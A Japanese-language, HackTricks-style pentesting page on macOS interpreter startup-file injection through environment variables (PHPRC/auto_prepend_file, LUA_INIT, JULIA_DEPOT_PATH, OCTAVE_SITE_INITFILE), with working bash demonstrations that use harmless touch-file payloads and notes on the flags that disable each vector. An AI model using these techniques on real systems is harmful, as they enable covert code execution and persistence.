# macOS Interpreter Startup-File Injection

{{#include ../../../banners/hacktricks-training.md}}

これらのランタイム固有の手法では、継承された環境変数を使って、意図されたスクリプトより前に読み込む起動設定やコードを指定します。Lua はインラインコードを使う方法にも対応しています。

## PHP startup configuration

### `PHPRC` / `PHP_INI_SCAN_DIR` and `auto_prepend_file`

PHP CLI と CGI は、起動のたびに設定を読み込みます。`PHPRC` で攻撃者が読み取り可能な `php.ini` を指定でき、`PHP_INI_SCAN_DIR` で追加の `.ini` ファイルを検索するディレクトリを変更できます。`auto_prepend_file` ディレクティブを使うと、PHP は要求されたスクリプトの前にファイルを解析するため、この組み合わせによって起動時のコード実行が可能になります。<sup>[[1]](#references)[[2]](#references)</sup>

```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```

別の方法として、`.ini` ファイルを含むディレクトリを使用できます:

```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```

`-n` オプションは `php.ini` を無視します。信頼できるパスを明示した `-c` は `PHPRC` より優先されます。長時間稼働するサーバー SAPI は通常、Web サーバーの起動時に設定を読み込みますが、CLI と CGI は呼び出しごとに読み込みます。<sup>[[1]](#references)</sup>

## Lua 起動コード

### `LUA_INIT`

コマンドラインオプションや対象スクリプトの処理前に、スタンドアロンの Lua インタープリターは `LUA_INIT_<major>_<minor>` を実行します。このバージョン指定付き環境変数が設定されていない場合は、`LUA_INIT` を実行します。値が `@` で始まる場合はファイルを指定し、それ以外の値は Lua コードとして直接評価されます。これにより、ファイルを使う方法と使わない方法の両方で、起動時にコードを実行できます。<sup>[[3]](#references)</sup>

```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```

インタープリターに応じて、正確なバージョン付きの名前は変わります。たとえば `LUA_INIT_5_4` です。`lua -E` は、起動コードやLuaのモジュールパスを含むすべての環境変数を無視します。

## Juliaの起動用depot

### `JULIA_DEPOT_PATH` と `startup.jl`

Juliaは通常、起動時に最初のdepotにある `config/startup.jl` を実行します。`JULIA_DEPOT_PATH` はdepotの一覧を制御するため、攻撃者が読み取り可能なツリーを指定すると、自動的に読み込まれる起動ファイルの参照先を変更できます。<sup>[[4]](#references)[[5]](#references)</sup>

```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```

末尾の区切り文字は、被害者が通常の packages も引き続き必要とする場合に役立ちます。`julia --startup-file=no` を指定すると、この startup file は無効になります。起動前にこの変数をクリアしてください。この変数は package registries、environments、caches、code-loading locations も制御するためです。

## GNU Octave の startup files

### `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave は起動時に、有効な Octave コマンドを含む複数のファイルを実行します。`OCTAVE_SITE_INITFILE` は site-wide startup file を上書きし、`OCTAVE_VERSION_INITFILE` は version-specific startup file を上書きするため、どちらの変数でも自動実行先を攻撃者が読み取り可能なファイルに変更できます。<sup>[[6]](#references)</sup>

```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```

`--no-init-file` は `~/.octaverc` などのユーザーファイルのみをスキップします。上記の site-file override は無効になりません。site files には `--no-site-file` を使い、すべての起動ファイルを無効にするには `--norc` / `-f` を使ってください。<sup>[[7]](#references)</sup>

## References

- [1] [PHP設定ファイル](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
- [3] [Lua 5.4スタンドアロンインタプリタ](https://www.lua.org/manual/5.4/manual.html#7)
- [4] [Juliaコマンドラインインターフェース: 起動ファイル](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [5] [Julia環境変数: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
- [6] [GNU Octaveの起動ファイル](https://docs.octave.org/latest/Startup-Files.html)
- [7] [GNU Octaveのコマンドラインオプション](https://docs.octave.org/latest/Command-Line-Options.html)
{{#include ../../../banners/hacktricks-training.md}}
